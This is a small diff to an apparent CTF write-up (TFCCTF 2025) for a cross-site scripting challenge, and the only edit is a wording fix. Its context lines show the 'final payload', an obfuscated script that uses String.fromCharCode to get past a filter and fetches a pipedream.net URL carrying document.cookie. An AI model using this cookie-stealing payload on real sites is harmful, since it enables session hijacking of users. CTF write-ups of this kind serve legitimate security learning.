@@ -142,7 +142,7 @@ Final payload:
 ${banned[1]}Script${banned[2]}fetch${banned[3]}'http'+String['fromCharCode']${banned[3]}115${banned[4]}+'://eogce8tgujfgk5f'+String['fromCharCode']${banned[3]}46${banned[4]}+'m'+String['fromCharCode']${banned[3]}46${banned[4]}+'pipedream'+String['fromCharCode']${banned[3]}46${banned[4]}+'net/?q'+String['fromCharCode']${banned[3]}61${banned[4]}+''+document['cookie']${banned[4]}${banned[1]}/Script${banned[2]}
 ```
 
-reporting to admin
+Reporting to the admin.
 
 <img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/10.png'>
 
